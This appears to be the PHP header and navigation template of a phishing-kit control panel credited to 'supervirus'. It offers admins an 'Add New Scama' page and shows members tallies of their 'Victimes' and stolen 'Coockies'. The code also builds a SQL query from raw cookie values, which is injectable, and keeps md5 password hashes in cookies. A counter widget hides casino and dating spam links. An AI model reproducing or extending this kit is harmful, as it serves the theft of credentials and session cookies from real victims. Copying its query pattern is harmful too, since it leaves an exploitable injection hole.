<CENTER>
<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################
session_start();
switch($method){
	case 'login';
	$user_name = addslashes(trim($_POST['user_name']));
	$user_pass = addslashes(md5($_POST['user_pass']));
	if(isset($user_name) and isset($user_pass) and $user_name != '' and $user_pass != ''){
		if(is_in_db($user_name) > 0){
			if(check_pass($user_name,$user_pass)){
			setcookie('user_name_cookie',$user_name,time()+(60*60*24*30));
			setcookie('user_pass_cookie',$user_pass,time()+(60*60*24*30));
			}
		}
	}
	break;
	case 'logout';
	setcookie('user_name_cookie','',time()-(60*60*24*30*12));
	setcookie('user_pass_cookie','',time()-(60*60*24*30*12));
	redirect2();
	break;
}
	$sqlslectinfouser = mysql_query("SELECT * FROM ".prifex."users WHERE user_name = '".$_COOKIE['user_name_cookie']."' and user_password = '".$_COOKIE['user_pass_cookie']."'")or die(error_sql(mysql_error(),__LINE__,__FILE__));
		if(mysql_num_rows($sqlslectinfouser) > 0){
		$resultselectinfouser = mysql_fetch_object($sqlslectinfouser);
				$user_id = $resultselectinfouser->user_id;
				$user_name = $resultselectinfouser->user_name;
				$user_password = $resultselectinfouser->user_password;
				$user_email = $resultselectinfouser->user_email;
				$user_contry = $resultselectinfouser->user_contry;
				$user_date_register = $resultselectinfouser->user_date_register;
				$user_age = $resultselectinfouser->user_age;
				$user_level = $resultselectinfouser->user_level;
		}else{
				$user_id = 0;
				$user_name = 0;
				$user_password = 0;
				$user_email = 0;
				$user_contry = 0;
				$user_date_register = 0;
				$user_age = 0;
				$user_level = 0;
		}
				define(user_id,$user_id);
				define(user_level,$user_level);
				define(user_name,$user_name);
				define(user_email,$user_email);
				define(user_contry,$user_contry);
				define(user_date_register,$user_date_register);
				define(user_age,$user_age);
	mysql_free_result($sqlslectinfouser);
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" 
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" /> 
<script language="javascript" src="css/jquery.js"></script> 
<script language="javascript" src="css/global.js"></script> 
<link rel="stylesheet" type="text/css" href="css/styles.css" /> 
<script type="text/javascript" src="css/jquery.tooltip.v.1.1.js"></script> 
<link rel="stylesheet" href="css/simpletooltip.css" type="text/css" media="screen" />
';
title_page();
echo '
</head>
<body>
<table align="center" border="0" cellpadding="0" cellspacing="0" width="12">
	<tr>
                <td>
        <p align="center">
        <img border="0" src="image/header.jpg" width="800" hspace="0" /></td>
	</tr>
	<tr>
		<td>
		<div id="navbar">
			<ul>
				<li><a href="?" '.class_page('not_ex').'>Home</a></li>';
  if(user_level == 2){
		echo '	<li><a href="?do=scama&type=add_scama" '.class_page('scama').'>Add New Scama</a></li>
				<li><a href="?do=users" '.class_page('users').'>Members</a></li>';
  }
  if(user_level >0){
		echo '	<li><a href="?do=victims" '.class_page('victims').'>My Victimes</a></li>
				<li><a href="?do=coockie" '.class_page('coockie').'>Victimes Of Coockies Code</a></li>
				<li><a href="?method=logout">Logout</a></li>';
	}else{
		echo ' 	<li><a href="?do=register" '.class_page('register').'>Sing Up</a></li>
                                 <li><a href="http://co-n.cc" '.class_page('register').'>Shurt Link</a></li>';
	}
	echo '	</ul>
		</div>
		</td>
	</tr>
	<tr>
		<td>
		<table border="0" cellpadding="0" width="100%">
			<tr>
				<td width="200" valign="top">';
			if(user_level > 0){
				echo '<div class="head_panel">.: Member Panel :.</div>	
				<div class="body_panel">
				User name : <span>'.user_name.'</span> <br />
				All Victimes : <span>('.cont_all_victims(user_id).')</span> <br />'; 
					if(cont_new_victims(user_id) > 0){
						echo '	Victimes in 24 H : <span><font color="#00FF00">('.cont_new_victims(user_id).')</font></span> <br />';
					}
				echo 'Coockies info : <span>('.cont_all_coockies(user_id).')</span> <br />';
					if(cont_new_coockies(user_id) > 0){
						echo 'Coockies info in 24 H : <span><font color="#00FF00">('.cont_new_coockies(user_id).')</font></span> <br />';
					}
				echo '
	</div>';
			}else{
			echo '<div class="head_panel">.: Login Panel :.</div>	
				<div class="body_panel">
				<form method="POST" action="?method=login">
				User name <input class="inpt" name="user_name" size="15"><br />
				User pass &nbsp;<input class="inpt" type="password" name="user_pass" size="15"><br />
				<input class="btn" type="submit" value="Login">
				</form>
				</div>';
				}
				echo '<div class="head_panel">.: Links :.</div>	
					<div class="body_panel">
						<div class="links">
							<a target="_blank" href="https://www.facebook.com/l0ldz">Facebook Admin</a>
							<a target="_blank" href="https://www.facebook.com/l0ldz">l0ldz</a>
							<a target="_blank" href="http://co-n.cc/">Shurt Link</a>
						</div>
					</div>
					<div class="head_panel">.: Member :.</div>	
					<div class="body_panel">
					Visitor : <span> 183 </span><br />
					Members : <span> 176 </span><br />
					</div>
					<div class="head_panel">.: Onlign now :.</div>	
					<div align="center" class="body_panel">
                        <object id="counters99" allowscriptaccess="always" type="application/x-shockwave-flash" data="http://static.99widgets.com/counters/swf/counters.swf?id=832707_2&ln=en" width="150" height="175" wmode="transparent"><param name="allowscriptaccess" value="always" /><param name="movie" value="http://static.99widgets.com/counters/swf/counters.swf?id=832707_2&ln=en" /><param name="wmode" value="transparent" /><embed src="http://static.99widgets.com/counters/swf/counters.swf?id=832707_2&ln=en" type="application/x-shockwave-flash" allowscriptaccess="always" wmode="transparent" width="150" height="175"></embed><br><a href="http://www.datingsitesnow.com/">Dating sites</a> <a href="http://www.online-poker-index.com/titan-poker.htm">Titan Poker</a> <a href="http://at.casinostadt.com/europalace-casino.htm">EUROPALACE</a> <a href="http://www.onlinecasinoextra.com/au/">ONLINE CASINO</a> <a href="http://www.onlinecasinoau.com/jackpot-city-online-casino.htm">Jackpotcity</a></object>	
				</td>
				<td valign="top">
';
switch($method){
	case 'login';
	$user_name = addslashes(trim($_POST['user_name']));
	$user_pass = addslashes(md5($_POST['user_pass']));
	if(isset($user_name) and isset($user_pass) and $user_name != '' and $user_pass != ''){
		if(is_in_db($user_name) > 0){
			if(check_pass($user_name,$user_pass)){
			echo '
			<div style="position: absolute; width: 565px; height: 1200px; z-index: 1; left: 230px; top: 160px">
			<div class="head_panel">.: Login Panel :.</div>	
				<div class="body_panel">
					<center>Login Is Done <br />
					Welcome : <font color="#008000">'.$user_name.'</font> 
				</center></div>
			</div>';
			redirect2();
			}else{
			echo '
			<div style="position: absolute; width: 565px; height: 1200px; z-index: 1; left: 230px; top: 160px">
			<div class="head_panel">.: Login Panel :.</div>	
				<div class="body_panel">
					<center>Sorry But This Password Is Wrong </center>
		</div>
			</div>';
			redirect();
			}
		}else{
		echo '<div style="position: absolute; width: 565px; height: 1200px; z-index: 1; left: 230px; top: 160px">
			<div class="head_panel">.: Login Panel :.</div>	
				<div class="body_panel">
					Sorry But This Name Isnet Regisred In oure Website 
	</div>
		</div>';
		redirect();
		}
	}else{
	echo '<div style="position: absolute; width: 565px; height: 1200px; z-index: 1; left: 230px; top: 160px">
			<div class="head_panel">.: Login Panel :.</div>	
				<div class="body_panel">
					<center>You Must Complet All inputs </center>
				</div>
	</div>';
	redirect();
	}
	break;


}
?>
<!-- coodex -->
<link href="css/click.css" rel="stylesheet" type="text/css" />
<script src="css/click.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function(){
$(".TRAIDNT").mouseover(function(){
       $(this).filter(':not(:animated)').animate({width:135},{duration:500});
});
$(".TRAIDNT").mouseout(function(){
    $(this).animate({width:42});
});
});
</script>

<!-- Coodex -->

<div id="TRAIDNT">
    <div class="facebook TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>
    <div class="twitter TRAIDNT" onclick="location.href=''">

    </div>
    <div class="flickr TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>
    <div class="friendfeed TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>
    <div class="vimeo TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>
    <div class="youtube TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>

    <div class="linkedin TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>
    <div class="rss TRAIDNT" onclick="location.href='https://www.facebook.com/l0ldz'">
    </div>
</div>
<!-- coodex -->  
</CENTER>